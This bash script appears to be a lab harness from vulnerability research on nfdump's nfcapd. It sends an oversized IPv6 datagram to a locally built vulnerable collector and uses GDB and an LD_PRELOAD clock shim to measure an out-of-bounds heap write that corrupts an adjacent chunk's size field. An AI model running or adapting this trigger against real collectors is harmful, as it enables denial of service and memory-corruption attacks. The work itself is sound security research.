#!/usr/bin/env bash
# nfdump2shell: bounded lab-clock experiment on the IPv6 heap crossing.
# The store's 8 bytes are msecReceived from gettimeofday() (pinned
# nfcapd.c:343/:442, nfd_raw.c:188), not from the packet.  A lab-only
# LD_PRELOAD shim chooses that clock value so the overwritten adjacent
# chunk's size field can be a small value.  The collector binaries and the
# 65527-byte ::1 datagram are genuine; GDB only reads memory.  Any result
# is lab-chosen value / packet-chosen offset, never attacker byte control.
set -u
cd "$(dirname "$0")"
VP=${V_PLAIN:-src/build-vuln-plain/src}
OUT=${V6CLOCK_OUT:-harness/out/v6clock}
PORT=${V6CLOCK_PORT:-10267}
PORT2=${V6CLOCK_PORT2:-10268}
MS=${LAB_CLOCK_MS:-16640}   # 0x4100 -> post-write chunk size 0x41 (65)

if ! command -v gdb >/dev/null 2>&1; then
    echo "FAIL gdb required for live heap measurement"
    exit 2
fi
if [ ! -x "$VP/nfcapd/.libs/nfcapd" ]; then
    bash build-wire.sh || exit 2
fi
mkdir -p "$OUT" "$OUT/flows"
SO="$OUT/clock_shim.so"
gcc -O2 -shared -fPIC -o "$SO" harness/clock_shim.c -ldl || exit 2

DIR=$(mktemp -d "${TMPDIR:-/tmp}/nfd-v6clock.XXXXXX") || exit 2
trap 'rm -rf "$DIR"' EXIT
mkdir -p "$DIR/flows"
CMD="$DIR/gdb.cmd"
cat >"$CMD" <<EOF
set pagination off
set confirm off
set breakpoint pending on
break nfd_raw.c:256
commands
 silent
 printf "=== BEFORE_STORE ===\\n"
 set \$gbuf = (char *)in_buff
 set \$gchunk = (*(unsigned long *)(\$gbuf - 8) & ~7)
 set \$ghdr = \$gbuf - 16 + \$gchunk
 printf "MSEC=%lu\\n", (unsigned long)msecReceived
 printf "HDR_SIZE_BEFORE=%016lx\\n", *(unsigned long *)(\$ghdr + 8)
 continue
end
break nfd_raw.c:259
commands
 silent
 printf "=== AFTER_STORE ===\\n"
 printf "TARGET_BYTES=%02x%02x%02x%02x%02x%02x%02x%02x\\n", *(unsigned char *)(\$gbuf+65543), *(unsigned char *)(\$gbuf+65544), *(unsigned char *)(\$gbuf+65545), *(unsigned char *)(\$gbuf+65546), *(unsigned char *)(\$gbuf+65547), *(unsigned char *)(\$gbuf+65548), *(unsigned char *)(\$gbuf+65549), *(unsigned char *)(\$gbuf+65550)
 printf "HDR_SIZE_AFTER=%016lx\\n", *(unsigned long *)(\$ghdr + 8)
 kill
 quit
end
run -6 -b ::1 -p $PORT -M $DIR/flows -t 5
EOF

LAB_CLOCK_MS="$MS" LD_PRELOAD="$SO" \
LD_LIBRARY_PATH="$PWD/$VP/libnffile/.libs:${LD_LIBRARY_PATH:-}" \
    gdb -q -batch -x "$CMD" \
    --args "$VP/nfcapd/.libs/nfcapd" >"$DIR/gdb.log" 2>&1 &
GDBPID=$!
sleep 2
python3 harness/wire_send.py "$PORT" v6edge >"$DIR/sender.log" 2>&1
for _ in $(seq 1 60); do
    grep -qa '=== AFTER_STORE ===' "$DIR/gdb.log" && break
    sleep 0.25
done
wait "$GDBPID" || true

# Second, GDB-free run: does the collector still abort at shutdown?
mkdir -p "$OUT/flows-plain"
LAB_CLOCK_MS="$MS" LD_PRELOAD="$SO" \
LD_LIBRARY_PATH="$PWD/$VP/libnffile/.libs:${LD_LIBRARY_PATH:-}" \
    "$VP/nfcapd/.libs/nfcapd" \
    -6 -b ::1 -p "$PORT2" -M "$OUT/flows-plain" -t 5 \
    >"$OUT/plain.log" 2>&1 &
PID=$!
sleep 1
python3 harness/wire_send.py "$PORT2" v6edge >"$OUT/plain-sender.log" 2>&1
sleep 1
kill -TERM "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null
echo "$?" >"$OUT/plain-rc.txt"

cp "$DIR/gdb.log" "$OUT/gdb.log"
cp "$DIR/sender.log" "$OUT/sender.log"

MS="$MS" python3 - "$OUT/gdb.log" "$OUT/sender.log" "$OUT/plain-rc.txt" "$OUT/plain.log" <<'PY'
import os, re, struct, sys
g, s, rc, log = (open(p, errors='replace').read() for p in sys.argv[1:5])
ms = int(os.environ['MS'])
def one(pat, text):
    m = re.search(pat, text)
    return m.group(1) if m else None
p = f = 0
def ok(name, cond, detail=''):
    global p, f
    print('%s %s%s' % ('PASS' if cond else 'FAIL', name,
                       (' ' + detail) if detail else ''))
    if cond: p += 1
    else: f += 1
observed = one(r'MSEC=(\d+)', g)
before = one(r'HDR_SIZE_BEFORE=([0-9a-f]+)', g)
after = one(r'HDR_SIZE_AFTER=([0-9a-f]+)', g)
target = one(r'TARGET_BYTES=([0-9a-f]+)', g)
ok('injected clock reached the pinned store', observed == str(ms),
   'MSEC=%s expected=%d' % (observed, ms))
ok('v6 datagram is the 65527-byte maximum', 'WIRE_LEN=65527' in s)
ok('adjacent chunk started as the 32-byte ident chunk', before == '0000000000000021',
   'before=%s' % before)
ok('post-write chunk size equals the lab-chosen clock word shifted 7 bytes',
   after is not None and int(after, 16) == ms >> 8,
   'after=%s expected=%#x' % (after, ms >> 8))
want = struct.pack('<Q', ms).hex()
ok('heap bytes equal the injected little-endian word', target == want,
   'observed=%s expected=%s' % (target, want))
glibc = re.findall(r'(?:^|\n)(corrupted size vs\. prev_size|double free or corruption[^\n]*|free\(\):[^\n]*|malloc\(\):[^\n]*)', log)
print('PLAIN_RUN rc=%s diagnostic=%s' % (rc.strip(), glibc[:1]))
print('TOTAL: %d PASS / %d FAIL' % (p, f))
sys.exit(1 if f else 0)
PY
